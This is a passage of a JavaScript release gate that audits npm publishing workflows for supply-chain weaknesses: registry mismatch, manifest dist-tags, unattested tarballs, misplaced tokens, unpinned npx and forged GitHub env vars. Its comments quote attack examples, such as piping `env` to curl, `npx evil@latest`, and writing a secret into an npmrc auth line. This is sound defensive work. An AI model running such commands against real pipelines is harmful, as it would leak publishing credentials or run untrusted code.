              : typeof granted === 'object' && granted !== null
                ? granted[scope]
                : undefined;
        if (PERMISSION_RANK[have] === undefined || PERMISSION_RANK[have] < PERMISSION_RANK[needed]) {
          problems.push(
            `${file} job \`${jobName}\` grants \`${scope}: ${have ?? '(unset)'}\` but the payload ` +
              `declares \`${scope}: ${needed}\` — a called workflow may not exceed its caller's ` +
              'grant, and the run fails validation before it starts',
          );
        }
      }
    }
  }
  // A POSITIVE FLOOR, not just a non-empty input. Without this the entire rc stream could be
  // deleted — or re-inlined — with every gate in the repository green, which is precisely the
  // blind spot the reshape exists to close, rebuilt one level up.
  if (delegatingJobs === 0) {
    problems.push(
      'no workflow delegates to the reusable publish workflow — the publishing stream has been ' +
        'deleted or re-inlined, and the payload is certified over nothing',
    );
  }
  for (const who of inlinePublishers) {
    problems.push(`${who} runs \`npm publish\` inline instead of delegating to the reusable payload`);
  }
  return problems;
}

/**
 * The registry a package will ACTUALLY publish to must equal the one the invoking stream declares.
 *
 * WHY THIS IS NOT REDUNDANT with the `registry` assertion in checkPublishingCallersDelegate. Those
 * are two different mechanisms and only one of them picks the destination. Measured by a review
 * lens with a control — two identical throwaway manifests differing only by `publishConfig`, no
 * `--registry` flag, under a userconfig npmrc mimicking `setup-node`:
 *
 *   with publishConfig    -> npm targeted the publishConfig host
 *   without (the control) -> npm targeted the userconfig host
 *
 * So `setup-node`'s `registry-url` writes the auth line, and `publishConfig.registry` overrides
 * where the tarball goes. They agree today only by coincidence — both are GitHub Packages — and
 * nothing held them together. The live hazard is prod: `release.yml` still sets
 * `registry-url: https://registry.npmjs.org` and publishes `--provenance`, and with
 * `publishConfig` in place that publish is silently redirected to GitHub Packages, where the auth
 * line does not match and where provenance is unsupported anyway. REL3 (#364) folds `release.yml`
 * in; this check is what makes that fold fail loudly at PR time instead of at release time.
 *
 * PURE over `{packages, workflows}` so the probe table can drive it.
 */
export function checkRegistryAuthorityAgrees(packages, workflows) {
  const problems = [];
  if (!Array.isArray(packages) || packages.length === 0) {
    return ['no packages to check registry authority over — refusing to certify agreement over nothing'];
  }
  // The registries any caller actually asks for. A stream that declares nothing cannot disagree
  // with anything, which is checkPublishingCallersDelegate's problem, not this one.
  const declared = new Set();
  for (const { text } of workflows ?? []) {
    let wf;
    try {
      wf = parse(text);
    } catch {
      continue;
    }
    for (const job of Object.values(wf?.jobs ?? {})) {
      if (typeof job?.uses === 'string' && isOwnPayload(job.uses)) {
        const r = job?.with?.registry;
        if (typeof r === 'string' && r.trim() !== '') declared.add(r.trim().replace(/\/+$/, ''));
      }
      // ...AND EVERY INLINE PUBLISHER'S OWN `setup-node` registry-url. Collecting only from
      // delegating callers meant the check could not see `release.yml` — which still points
      // `registry-url` at npmjs.org while `publishConfig` sends the tarball to GitHub Packages, so
      // the next prod release authenticates against a host it never contacts. Review measured the
      // docstring's claim that this check "makes that fold fail loudly at PR time" to be false: it
      // would only have seen release.yml AFTER REL3 converted it, i.e. after the hazard. Reading
      // every publishing workflow's own registry-url puts it inside the window today.
      const steps = Array.isArray(job?.steps) ? job.steps : [];
      // Inline `npm publish`, or the prod publish script (REL3), which runs `npm publish` itself.
      const publishes = steps.some((st) => PUBLISHES_SOMEHOW.test(String(st?.run ?? '')));
      if (!publishes) continue;
      for (const st of steps) {
        const url = String(st?.uses ?? '').startsWith('actions/setup-node@') ? st?.with?.['registry-url'] : null;
        // A workflow EXPRESSION (the payload's `${{ inputs.registry }}`) is resolved by its caller, whose
        // concrete `registry` input is collected above; it is not itself a registry.
        // EXPRESSIONS ARE STRIPPED, NOT SKIPPED (REL3 pass 5, debugger): skipping any url containing
        // `${{` let `"${{ '' }}https://registry.npmjs.org"` through, which the base of this mission
        // refused. What remains after removing every expression is the literal part, and that is
        // what must agree with the manifests.
        if (typeof url === 'string') {
          const literal = url.replace(/\$\{\{[\s\S]*?\}\}/g, '').trim();
          if (literal !== '') declared.add(literal.replace(/\/+$/, ''));
        }
      }
    }
  }
  // A GATE MUST REFUSE AN EMPTY SET. With no declared registry anywhere the cross-check below
  // silently compares against nothing and reports green.
  if (declared.size === 0) {
    problems.push(
      'no workflow declares a publish registry — refusing to certify manifest/registry agreement ' +
        'over nothing',
    );
  }
  for (const p of packages) {
    if (p.private) continue;
    // A MANIFEST `tag` KEY OVERRIDES `npm publish --tag`, SILENTLY. npm resolves
    // `manifest.tag || defaultTag` (libnpmpublish publish.js:99), so `"tag": "latest"` in a
    // package.json claims the prod channel while the run log prints the flag's value — reproduced
    // by review against a local registry: PUT dist-tags={"latest": …} under `npm notice … with tag
    // rc`. Nothing in the repo read the key, so it was one JSON line away and unobservable.
    if (typeof p.tag === 'string' && p.tag.trim() !== '') {
      problems.push(
        `${p.name} declares a top-level \`"tag": ${JSON.stringify(p.tag)}\` in its manifest — npm ` +
          'resolves `manifest.tag || --tag`, so this silently overrides the dist-tag the workflow ' +
          'passes and the run log still reports the flag. The dist-tag is the stream\'s to set.',
      );
    }
    const effective = p.publishConfig?.registry;
    if (typeof effective !== 'string' || effective.trim() === '') {
      problems.push(
        `${p.name} declares no \`publishConfig.registry\`, so its destination is whatever npmrc the ` +
          'runner happens to carry rather than a property of the package',
      );
      continue;
    }
    const norm = effective.trim().replace(/\/+$/, '');
    if (norm !== GH_PACKAGES) {
      problems.push(
        `${p.name} has \`publishConfig.registry: ${norm}\`; the standing ruling is GitHub Packages ` +
          `only (${GH_PACKAGES})`,
      );
    }
    for (const d of declared) {
      if (d !== norm) {
        problems.push(
          `${p.name} publishes to \`${norm}\` via publishConfig, but a publishing workflow declares ` +
            `\`${d}\` — publishConfig selects the DESTINATION and the workflow's registry only the ` +
            'AUTH LINE, so that stream authenticates against a host it never contacts',
        );
      }
    }
  }
  return problems;
}

/**
 * Packages deliberately kept unpublishable. EMPTY, and that is the point: a package acquiring
 * `private: true` must acquire an entry here in the same commit, so the exclusion is a decision
 * someone wrote down rather than a flag someone set. Re-adding `private: true` to elements or
 * react without touching this list reds the gate — SC-005.
 */
const EXPECTED_PRIVATE = [];

/** Things that must never reach a consumer's node_modules (ADR-5 contents audit). */
const FORBIDDEN = [
  { re: /\.map$/, why: 'sourcemap' },
  { re: /\.(test|spec)\.[cm]?[jt]sx?$/, why: 'test file' },
  { re: /(^|\/)tsconfig[^/]*\.json$/, why: 'build config' },
  { re: /\.tsbuildinfo$/, why: 'incremental build state' },
  { re: /(^|\/)\.(env|npmrc|eslintrc)/, why: 'dev dotfile' },
];

/* ─────────────────────────── the checks, as pure functions ─────────────────────────── */

/** SC-001 — nothing is silently excluded from the release. */
/**
 * REL3 review: NO MANIFEST MAY CHOOSE ITS OWN DIST-TAG. Measured on npm 10.9.7: a top-level `tag`
 * beats `npm publish --tag` (libnpmpublish: `manifest.tag || defaultTag`), and `publishConfig.tag` is
 * the channel whenever no `--tag` is given (an explicit flag wins over it). Both streams now pass an
 * explicit tag, so `publishConfig.tag` is refused as insurance; a top-level `tag` would still override.
 */
export function checkNoManifestDistTag(packages) {
  const problems = [];
  for (const p of packages) {
    if (typeof p.tag === 'string' && p.tag.trim() !== '') {
      problems.push(`${p.name} declares "tag": ${JSON.stringify(p.tag)} — it overrides \`npm publish --tag\`; the dist-tag is the workflow's to set`);
    }
    const pc = p.publishConfig?.tag;
    if (typeof pc === 'string' && pc.trim() !== '') {
      problems.push(`${p.name} declares "publishConfig.tag": ${JSON.stringify(pc)} — it picks the channel whenever a publish omits \`--tag\`; remove it`);
    }
  }
  return problems;
}

export function checkNothingSilentlyPrivate(packages, expectedPrivate) {
  const problems = [];
  const unexpected = packages.filter((p) => p.private && !expectedPrivate.includes(p.name));
  for (const p of unexpected) {
    problems.push(
      `${p.name} is marked "private": true and is not in EXPECTED_PRIVATE, so the release would ` +
        `skip it WITHOUT FAILING (npm publish exits 0 on a private package). Either publish it or ` +
        `record why it is excluded.`,
    );
  }
  const stale = expectedPrivate.filter((n) => !packages.some((p) => p.name === n && p.private));
  for (const n of stale) {
    problems.push(`EXPECTED_PRIVATE lists ${n}, which is not private (or does not exist) — stale entry.`);
  }
  return problems;
}

/** SC-001 — every publishable package actually produces a tarball with files in it. */
export function checkTarballsNonEmpty(tarballs) {
  const problems = [];
  if (tarballs.length === 0) {
    problems.push('no tarballs were produced at all — refusing to report green over an empty set');
    return problems;
  }
  for (const t of tarballs) {
    if (!t.files || t.files.length === 0) {
      problems.push(`${t.name} packed ZERO files — a published empty package is worse than none`);
      continue;
    }
    // THE FLOOR WAS UNREACHABLE. npm ALWAYS packs package.json (and picks up README/LICENSE),
    // so `files.length === 0` cannot happen for a real package: a lens created a package with
    // `files: []` and `main` pointing at a path that does not exist, and this gate reported
    // "all packing, all exports resolving" over a tarball containing nothing but its manifest.
    // The floor has to be "something a consumer can actually use".
    const payload = t.files.filter((f) => !/^(package\.json|README(\.md)?|LICENSE(\.md|\.txt)?)$/i.test(f));
    if (payload.length === 0) {
      problems.push(
        `${t.name} packed only its manifest and boilerplate (${t.files.join(', ')}) — ` +
          `npm always includes those, so this package ships nothing a consumer can use`,
      );
    }
  }
  return problems;
}

/**
 * SC-002 — the legacy entry points, for a package with no `exports` map.
 *
 * checkExportsResolve only fires when `t.exports` is truthy, so a package declaring only `main`
 * and `types` received ZERO entry-point validation. A lens got a package past the gate whose
 * `main` pointed at a file that was not in the tarball.
 */
export function checkLegacyEntriesResolve(tarballs) {
  const problems = [];
  for (const t of tarballs) {
    for (const field of ['main', 'types', 'module', 'browser']) {
      const target = t[field];
      if (typeof target !== 'string') continue;
      const clean = target.replace(/^\.\//, '');
      if (!t.files.includes(clean)) {
        problems.push(`${t.name}: "${field}": "${target}" is not in the tarball`);
      }
    }
    if (!t.exports && !t.main) {
      problems.push(`${t.name} declares neither "exports" nor "main" — nothing states its entry point`);
    }
  }
  return problems;
}

/**
 * SC-002 — every `exports` target resolves to a file inside that package's OWN tarball.
 *
 * `npm pack` does not resolve entry points, so a package can pack cleanly while its `exports` map
 * points at files that were never included. That is a 404 at `import`, discovered by a consumer.
 *
 * WILDCARDS ARE WHERE THIS GETS SUBTLE. `"./dist/*": "./dist/*"` cannot be compared literally to a
 * file list. It is expanded to a prefix/suffix match — and A PATTERN MATCHING ZERO FILES IS A
 * FAILURE, not a pass. That is the empty-set rule one level down, and it is the likeliest place
 * for this gate to certify absence in exactly the shape it exists to prevent.
 */
export function checkExportsResolve(tarballs) {
  const problems = [];
  for (const t of tarballs) {
    const targets = collectExportTargets(t.exports);
    // A package with an `exports` map that yields no targets has a map that says nothing.
    if (t.exports && targets.length === 0) {
      problems.push(`${t.name} has an "exports" map from which no target path could be read`);
    }
    for (const target of targets) {
      const clean = target.replace(/^\.\//, '');
      if (clean.includes('*')) {
        const [pre, post] = clean.split('*');
        const hits = t.files.filter((f) => f.startsWith(pre) && f.endsWith(post ?? ''));
        if (hits.length === 0) {
          problems.push(
            `${t.name}: exports pattern "${target}" matches ZERO files in the tarball — ` +
              `a wildcard over nothing is not a working entry point`,
          );
        }
      } else if (!t.files.includes(clean)) {
        problems.push(`${t.name}: exports target "${target}" is not in the tarball`);
      }
    }
  }
  return problems;
}

/**
 * FR-010 — every component directory is reachable by subpath.
 *
 * checkExportsResolve catches a BROKEN export. It cannot catch a MISSING one: @spec-kitty/styles
 * shipped subpaths for 3 of its 15 component directories and every one of the three resolved, so
 * the map was simultaneously correct and twelve entries short. The same shape as the hand-written
 * barrel in packages/styles/src/index.ts, where #77 found SkGridGap4HTML simply absent.
 *
 * Directory-per-component is this package's layout, so the source tree is the authority for what
 * the map should contain.
 */
export function checkSubpathCoverage(componentDirs, exportKeys, pkgName) {
  const problems = [];
  if (componentDirs.length === 0) {
    return [`${pkgName}: no component directories found — refusing to certify coverage over nothing`];
  }
  for (const dir of componentDirs) {
    if (!exportKeys.some((k) => k === `./${dir}/*` || k === `./${dir}`)) {
      problems.push(`${pkgName}: component "${dir}" has no subpath export — its CSS is unreachable`);
    }
  }
  return problems;
}

/** SC-010 — no sourcemaps, tests, or dev files reach a consumer. */
export function checkForbiddenContents(tarballs) {
  const problems = [];
  for (const t of tarballs) {
    for (const f of t.files) {
      const hit = FORBIDDEN.find((p) => p.re.test(f));
      if (hit) problems.push(`${t.name} ships ${hit.why}: ${f}`);
    }
  }
  return problems;
}

/**
 * SC-004 — release.yml consumes the derived list and contains no hand-written package enumeration.
 *
 * Checking that the derived list is USED is not enough; the failure mode being prevented is a
 * second list living beside it. So this also refuses any `run:` block in the release job that
 * names two or more known packages literally.
 */
/**
 * REL3 (#364): EVERY PUBLISH IS OF ATTESTED BYTES. For either publish path (`publish` = the rc
 * payload, `release` = prod) this asserts, over the PARSED steps:
 *   - a SHA-pinned `actions/attest-build-provenance` step, unconditional, whose only subject is
 *     `dist-tarballs/*.tgz` (the directory pack-derived-set.mjs writes and the publish reads);
 *   - the order bump < pack < attest < publish < verify — an attestation after the publish, or a pack
 *     before the bump, certifies bytes other than the ones that shipped;
 *   - prod's loop publishes only `"$file"` from the attested list, never a package directory;
 *   - the job actually holds `id-token: write` and `attestations: write` (a floor; the ceiling check
 *     in checkPublishingCallersDelegate covers the callers).
 */
const ATTEST_USES = /^actions\/attest-build-provenance@[0-9a-f]{40}$/;
const ATTEST_SUBJECT = `${PACK_DIR_NAME}/*.tgz`; // the one directory pack-derived-set.mjs writes
function checkAttestation(wf, jobName, steps, label, stripShellComments) {
  const problems = [];
  const runOf = (st) => (typeof st.run === 'string' ? stripShellComments(st.run) : '');
  const idx = (pred) => steps.findIndex(pred);
  const isAttest = (st) => SIGNS_ATTESTATION([st]);
  const attest = steps.filter(isAttest);
  if (attest.length === 0) {
    problems.push(`${label} publishes without an \`actions/attest-build-provenance\` step — nothing it ships is attested (#364)`);
    return problems;
  }
  for (const st of attest) {
    const uses = st.uses.trim();
    if (!ATTEST_USES.test(uses)) problems.push(`${label}: the attest step uses \`${uses}\`, not a 40-hex SHA pin of actions/attest-build-provenance`);
    if (st.if !== undefined) problems.push(`${label}: the attest step carries an \`if:\` — a condition can publish unattested bytes`);
    const w = st.with ?? {};
    if (w['subject-path'] !== ATTEST_SUBJECT) {
      problems.push(`${label}: the attest step's subject-path is ${JSON.stringify(w['subject-path'])}, not \`${ATTEST_SUBJECT}\` — it must cover exactly the tarballs that get published`);
    }
    for (const k of ['subject-digest', 'subject-checksums', 'subject-name']) {
      if (w[k] !== undefined) problems.push(`${label}: the attest step sets \`${k}\` — a second subject source can certify something other than dist-tarballs/`);
    }
    // A CUSTOM PREDICATE replaces the SLSA build-provenance statement consumers verify by default.
    for (const k of ['predicate-type', 'predicate', 'predicate-path']) {
      if (w[k] !== undefined) problems.push(`${label}: the attest step sets \`${k}\` — a custom predicate breaks the SLSA provenance consumers verify with \`gh attestation verify\``);
    }
  }
  const packAt = idx((st) => runOf(st).trim() === 'node scripts/pack-derived-set.mjs');
  const attestAt = idx(isAttest);
  const publishAt = jobName === 'release' ? idx((st) => runOf(st).trim() === 'node scripts/publish-latest.mjs') : idx((st) => /publish-derived-set\.mjs/.test(runOf(st)));
  const verifyAt = idx((st) => runOf(st).trim() === 'node scripts/verify-published-integrity.mjs');
  const bumpAt = idx((st) => /bump-prerelease\.mjs/.test(runOf(st)));
  if (packAt !== -1 && attestAt !== -1 && publishAt !== -1 && verifyAt !== -1) {
    if (!(packAt < attestAt)) problems.push(`${label} attests before it packs — the attestation cannot cover the tarballs`);
    if (!(attestAt < publishAt)) problems.push(`${label} publishes before it attests — an attest failure would come after the bytes shipped`);
    // NOTHING BETWEEN ATTEST AND PUBLISH. A step there could delete and repack dist-tarballs/ (review
    // reproduced it green): readPacked would then validate the NEW bytes against a NEW manifest.
    else if (publishAt !== attestAt + 1) problems.push(`${label} runs a step between the attest and the publish — it could replace the attested tarballs`);
    if (!(publishAt < verifyAt)) problems.push(`${label} runs the integrity check before the publish — it would compare against nothing published yet`);
  }
  if (bumpAt !== -1 && packAt !== -1 && !(bumpAt < packAt)) {
    problems.push(`${label} packs before the prerelease bump — the attested tarballs would carry the unbumped version`);
  }
  if (jobName !== 'release' && steps.some((st) => /publish-latest\.mjs(?!\s*--selftest)/.test(runOf(st)))) {
    problems.push(`${label} runs scripts/publish-latest.mjs — the prerelease payload must never write \`latest\``);
  }
  // THE JOB IS THE TRUST BOUNDARY (`id-token: write` reaches every step), so what else each step holds
  // is gated, not just stated (REL3 review: six reverts of this hardening were green):
  //   - the registry token only on the steps that talk to the registry, never job- or workflow-wide;
  //   - checkout keeps no credentials;
  //   - every `npx` runs the lockfile's copy (`--no-install`), never something fetched at release time;
  //   - the verify step pins which workflow, on which commit, signed the attestation.
  // WHO MAY HOLD THE TOKEN, by the run's exact text, not by a name appearing in it: a substring
  // test was satisfied by `echo publish-latest.mjs` in front of anything (REL3 pass 3). NO SHELL
  // STEP MAY HOLD IT AT ALL (REL3 pass 4, reducer): the dist-tag report was the one exception, and
  // bounding how many such steps there were could not bound what they did — appending
  // `env | curl -d @- …` to it passed every rule, because the exfiltration never names the
  // variable. The report is now scripts/report-dist-tags.mjs, so the exception is gone.
  // BUILT FROM THE SHARED LIST (REL3 pass 7, reviewer and reducer): this re-spelled the five names, so a
  // sixth registry script would have needed two edits — the drift this mission is about.
  // `--from-registry` belongs to the bump alone; the refactor to the shared list briefly allowed it
  // after any of the five (REL3 pass 8, reducer).
  const TOKEN_SCRIPT_RUN = new RegExp(`^node scripts/(?:bump-prerelease\\.mjs --from-registry|(?:${REGISTRY_SCRIPTS.filter((n) => n !== 'bump-prerelease').join('|')})\\.mjs)$`);
  for (const [where, env] of [['job', wf?.jobs?.[jobName]?.env], ['workflow', wf?.env]]) {
    if (env && typeof env === 'object' && 'NODE_AUTH_TOKEN' in env) {
      problems.push(`${label} sets NODE_AUTH_TOKEN at ${where} level — it must reach only the steps that talk to the registry`);
    }
  }
  for (const st of steps) {
    if (st.env && typeof st.env === 'object' && 'NODE_AUTH_TOKEN' in st.env && !TOKEN_SCRIPT_RUN.test(runOf(st).trim())) {
      problems.push(`${label} step "${st.name ?? runOf(st).trim().slice(0, 40)}" holds NODE_AUTH_TOKEN but is not an exact registry-script run`);
    }
    // SPLIT ON A SINGLE `|` TOO (REL3 pass 5, debugger): `npx evil@latest | npx --no-install cat`
    // kept the whole line in one piece, so the pinned half satisfied the test for both.
    for (const inv of runOf(st).split(/&&|\|\||\||;|\n/)) {
      // `npx` anywhere in the command (including inside `$( … )` or backticks), and `npm exec`: both
      // may fetch. `--no-install` and its documented synonym `--no` pin them to the lockfile's copy.
      const pinned = (tool) => new RegExp(`${tool}\\s+(--no-install|--no)(\\s|$)`).test(inv);
      if (/(^|[\s($`|&;])npx\s/.test(inv) && !pinned('npx')) {
        problems.push(`${label} runs \`${inv.trim().slice(0, 60)}\` — every npx in a publish job must be \`npx --no-install\` (the lockfile's copy, never a release-time fetch)`);
      }
      // `npm x` is npm's own documented alias for `npm exec`, and it was not covered.
      if (/\bnpm\s+(exec|x)\b/.test(inv) && !pinned('npm\\s+(exec|x)')) {
        problems.push(`${label} runs \`${inv.trim().slice(0, 60)}\` — \`npm exec\`/\`npm x\` in a publish job must pass \`--no\` (never a release-time fetch)`);
      }
    }
    // …AND NO STEP MAY PUT A CREDENTIAL IN ITS RUN AT ALL. `echo "NODE_AUTH_TOKEN=…" >> "$GITHUB_ENV"`
    // would make it job-wide again; writing an `.npmrc` auth line from `${{ secrets.… }}` authenticates
    // npm without ever naming the variable. INSIDE the audited jobs the privilege is legitimately
    // present, so text is the only fence here — and this rule was still the narrow, older text while
    // discovery had already learned the wider one (REL3 pass 7, architect: a step writing
    // `_authToken=${{ secrets.GITHUB_TOKEN }}` and running a wrapper was byte-identical to baseline,
    // in the very job that holds the Sigstore token, after the attest step).
    if (WRITES_REGISTRY_CREDENTIAL.test(runOf(st)) || EXPANDS_A_SECRET.test(runOf(st))) {
      problems.push(`${label} step "${st.name ?? runOf(st).trim().slice(0, 40)}" puts a credential in its run — it could re-export the token to every later step, or authenticate npm without naming it. Pass secrets through \`env:\` on the step that needs them`);
    }
  }
  // A LOCAL ACTION IS A HOLE IN EVERY RULE ABOVE (REL3 pass 4, reviewer). All of them read this
  // workflow's step text; `uses: ./.github/actions/x` runs steps written somewhere else, in a job
  // that holds `id-token: write`. Third-party actions are SHA-pinned and covered by
  // check-action-pins.sh; a local one is refused outright on a publishing path.
  for (const st of steps) {
    if (typeof st.uses === 'string' && st.uses.trim().startsWith('./')) {
      problems.push(`${label} step "${st.name ?? st.uses}" runs a local action (\`${st.uses.trim()}\`) — its steps are outside every rule this gate applies to the publishing job`);
    }
  }
  const checkouts = steps.filter((st) => typeof st.uses === 'string' && /^actions\/checkout@/.test(st.uses.trim()));
  if (checkouts.length === 0) problems.push(`${label} has no actions/checkout step to hold to persist-credentials: false`);
  for (const st of checkouts) {
    if (st.with?.['persist-credentials'] !== false) problems.push(`${label}'s checkout does not set \`persist-credentials: false\` — the token would sit in .git/config for every later step`);
  }
  const verifyStep = verifyAt === -1 ? null : steps[verifyAt];
  if (verifyStep) {
    const want = `spec-kitty/spec-kitty-design/.github/workflows/${jobName === 'release' ? 'release.yml' : 'publish-packages.yml'}`;
    const env = verifyStep.env ?? {};
    if (env.SIGNER_WORKFLOW !== want) problems.push(`${label}'s verify step must pin SIGNER_WORKFLOW to \`${want}\` (got ${JSON.stringify(env.SIGNER_WORKFLOW)})`);
    if (env.SOURCE_DIGEST !== '${{ github.sha }}') problems.push(`${label}'s verify step must pin SOURCE_DIGEST to \`\${{ github.sha }}\``);
    if (!env.GH_TOKEN) problems.push(`${label}'s verify step has no GH_TOKEN for \`gh attestation verify\``);
  }
  const perms = wf?.jobs?.[jobName]?.permissions ?? wf?.permissions;
  for (const scope of ['id-token', 'attestations']) {
    // An explicit object only: `write-all` is a blanket grant and does not count as holding these.
    const level = perms && typeof perms === 'object' ? perms[scope] : undefined;
    if (level !== 'write') problems.push(`${label} does not hold \`${scope}: write\` — the attest step cannot sign or store its attestation`);
  }
  return problems;
}

export function checkWorkflowUsesDerivedSet(
  workflowText,
  packageNames,
  packageDirs,
  // PARAMETERISED (REL2, #363). This used to hard-code `jobs.release`, so every one of the seven
  // REQUIRED_STEPS assertions below applied to release.yml and nothing else. When the rc stream
  // arrived as a second publishing workflow with a differently-named job, it inherited none of
  // them: measured at the time, deleting its publish step — or its `--tag` — left every gate in
  // the repository green. All four review lenses reached that independently.
  //
  // Defaulted to 'release' so the probe table and VALID_RELEASE_WORKFLOW keep exercising the
  // original shape unchanged; the real call-sites name their job explicitly.
  jobName = 'release',
  label = `${jobName === 'release' ? 'release.yml' : 'the workflow'}`,
) {
  const problems = [];
  const wf = parse(workflowText);
  const steps = wf?.jobs?.[jobName]?.steps;
  if (!Array.isArray(steps) || steps.length === 0) {
    return [`${label} has no \`${jobName}\` job steps to check`];
  }
  // THE WHOLE STEP, not just `run:`. A lens re-added the two original per-package steps verbatim
  // —
  //     - name: Publish @spec-kitty/tokens (FR-044)
  //       run: npm publish --provenance --access public
  //       working-directory: packages/tokens
  //
  // — and this check passed, because each step's package identity lives in `working-directory`
  // and `name`, not in `run`. That is the EXACT shape of the drift this mission removed, so the
  // check was blind to its own subject. `env` and `with` are folded in for the same reason.
  const stepText = (s) =>
    [s.name, s.run, s['working-directory'], ...Object.values(s.env ?? {}), ...Object.values(s.with ?? {})]
      .filter((v) => typeof v === 'string')
      .join('\n');
  const runs = steps.map((s) => ({ name: s.name ?? '(unnamed)', run: stepText(s), isPerPackageDir: typeof s['working-directory'] === 'string' && /^packages\//.test(s['working-directory']) }));
  // COMMANDS ONLY for the payload assertions, AND SHELL COMMENTS STRIPPED. `stepText` deliberately
  // folds `name` and `working-directory` in, because that is where a hand-written per-package step
  // hides its identity — but using the SAME haystack for "does this workflow actually publish" made
  // the requirement satisfiable by PROSE. A lens deleted the publish step, left a step titled
  // `was: npm publish --provenance --access public over the derived set`, and the gate went green.
  //
  // Dropping `name` closed that on one channel and left it open on another: two lenses then
  // defeated the `--tag` assertion below with a one-line shell comment
  // (`# historical: npm publish --tag "$TAG" used to run here`) and with an `echo` in an unrelated
  // step, each restoring green over a real tagless publish. Comments are prose too. The
  // hand-written-list loop further down already strips them; this is the same treatment applied to
  // the same class of haystack.
  const stripShellComments = (t) =>
    t
      .split('\n')
      .filter((l) => !/^\s*#/.test(l))
      .join('\n');
  const commandLines = steps.map((s) => (typeof s.run === 'string' ? stripShellComments(s.run) : ''));
  const commands = commandLines.join('\n');

  // THE PAYLOAD. A lens deleted the entire publish step and this check still exited 0: it
  // asserted that the derived set was USED, never that anything was published. A release
  // workflow that publishes nothing is the mission's own stated defect class.
  // PER-STREAM, because the gate set is a property of the ARTIFACT, not of which workflow happens
  // to publish it — but two of these are genuinely prod-only and demanding them everywhere is a
  // false failure, not a stricter gate:
  //
  //   provenance — npm provenance is an npmjs.org feature and is UNSUPPORTED on GitHub Packages
  //                (recorded in #363's constraints). The rc stream cannot satisfy it, ever.
  //   the SBOM   — feeds the GitHub Release that only the prod stream cuts.
  //
  // The other five are the ones the rc path dropped when it was a separate file, and restoring
  // them is the substance of this reshape. Getting this wrong in the first draft turned the real
  // run red while the selftest stayed green, because every fixture used the default job.
  const PROD_ONLY_STEPS = [
    // PROVENANCE IS NO LONGER REQUIRED, AND THAT IS A LOSS RECORDED RATHER THAN A RULE RELAXED.
    // This used to be `npm publish --provenance --access public`. npm provenance is an npmjs.org
    // MECHANISM, unsupported on GitHub Packages, and prod moved there by operator decision once
    // review measured that `publishConfig` was already redirecting its tarballs. The `--provenance`
    // INVOCATION cannot succeed on this registry, so asserting it would assert something no correct
    // workflow can do. The CONTROL is relocated, not retired: #364 scope item 3 replaces it with
    // `actions/attest-build-provenance` per the 2026-09-11 operator amendment on #361. Do not
    // restate this as "FR-044 is impossible" — an earlier revision did, in three places, and it is
    // false.
    //
    // What remains asserted is that prod actually publishes — dropping the flag must not be a
    // route to dropping the publish. Since REL3 (#364) that is publish-latest.mjs, never inline npm.
    [/node\s+scripts\/publish-latest\.mjs/, 'the prod publish (scripts/publish-latest.mjs)'],
    [/cyclonedx/i, 'the SBOM'],  // prod-only as a RELEASE input; the rc stream still emits one as an artifact
  ];
  const EVERY_STREAM_STEPS = [
    [/npm\s+pack\b/, 'the contents audit'],
    [/check-release-graph\.mjs(?!\s*--selftest)/, 'the release-graph assertion on the publishing path'],
    [/check-release-graph\.mjs\s+--selftest/, "the gate's own blindness check on the publishing path"],
    [/check-vue-packed-types\.mjs/, 'the packed Vue declaration check on the publishing path'],
    [/measure-elements-sizes\.mjs\s+--check/, 'the size and SRI drift check on the publishing path'],
    [/build-opendesign-package\.mjs\s+--check/, 'the OpenDesign package drift check on the publishing path'],
    // ADDED AFTER REVIEW MEASURED ITS DELETION AS GREEN. The audit gate carries an
    // `[ENFORCED]` label in the payload, and in this repo that prefix means "registered in a wiring
    // checker" — it was decoration until now. (The bump is asserted separately below, not here.)
    [/npm-audit-gate\.sh/, 'the ADR-005 security gate before publish'],
    // Renata M18: deleting the dist-tag report survived every gate for three passes. Non-`latest`
    // tags never appear in the GitHub web UI, so this step is the ONLY place an operator can see
    // that the publish landed — which makes it evidence, not decoration.
    // The dist-tag report is NOT listed here: it is in the EXACT-step list below, which subsumes a
    // presence test (REL3 pass 5, architect — deleting the presence entry left every probe green,
    // so the line was not doing the work its comment claimed).
  ];
  // AND NO ENV VALUE MAY CARRY A CREDENTIAL EXCEPT ON THE STEP THAT NEEDS IT (REL3 pass 8, debugger;
  // tightened at pass 10 by the reducer and the debugger together). Every other credential rule reads
  // run text or the env KEY, so `env: T: ${{ secrets.… }}` handed the job the same credential under a
  // name nothing matched. The two exemptions live INSIDE this decision rather than in the loop around
  // it: the pass-10 defect was exactly that the loop flattened workflow/job/step blocks and discarded
  // the step, so the GH_TOKEN exemption applied to any step at all — one with `env: GH_TOKEN` and a
  // wrapper that writes the token into an npmrc published green, with the reducer's runtime proof.
  for (const [where, block, step] of [
    ['workflow', wf?.env, null],
    ['job', wf?.jobs?.[jobName]?.env, null],
    ...steps.map((st) => ['step', st?.env, st]),
  ]) {
    if (!block || typeof block !== 'object') continue;
    for (const [key, value] of Object.entries(block)) {
      const why = forbiddenEnvCredential({ key, value, step });
      if (why) problems.push(`${label} puts a credential in the ${where}-level \`${key}\` — ${why}`);
    }
  }
  // THE JOB MAY NOT AUTHOR THE SIGNALS ITS OWN GUARD READS. Both publish scripts decide their
  // channel from GITHUB_REF/GITHUB_REF_TYPE, the runner's event file and (REL3) GITHUB_WORKFLOW_REF;
  // GITHUB_RUN_ATTEMPT turns an unexpected first-attempt conflict into a silent "resumption". A step
  // that sets any of them forges the evidence. THIS APPLIES TO BOTH AUDITED JOBS: it used to sit
  // inside the `jobName !== 'release'` branch, so it audited the rc payload alone — while
  // GITHUB_WORKFLOW_REF, which prod's guard leans on hardest, was not in the list at all
  // (REL3 pass 5, debugger).
  const FORGEABLE = ['GITHUB_REF', 'GITHUB_REF_TYPE', 'GITHUB_EVENT_PATH', 'GITHUB_RUN_ATTEMPT', 'GITHUB_WORKFLOW_REF', 'GITHUB_REF_NAME'];
  for (const block of [wf?.env, wf?.jobs?.[jobName]?.env, ...steps.map((st) => st?.env)]) {
    if (typeof block !== 'object' || block === null) continue;
    for (const key of Object.keys(block)) {
      if (FORGEABLE.includes(key)) {
        problems.push(
          `${label} sets \`${key}\` in an \`env:\` block — that is the evidence the publish ` +
            'guard weighs, and a job that can author it is a job that can authorise itself',
        );
      }
    }
  }
  // BOTH AUDITED JOBS, not the payload alone (REL3 pass 8, debugger). These two rules lived inside the
  // `jobName !== 'release'` branch, so prod — the job that owns `latest` — was the one place in the
  // repository where `npm dist-tag add` was permitted, and its inline-publish test was the weaker of
  // the two. A "Promote the release tag" step would have repointed `latest` at any version it named,
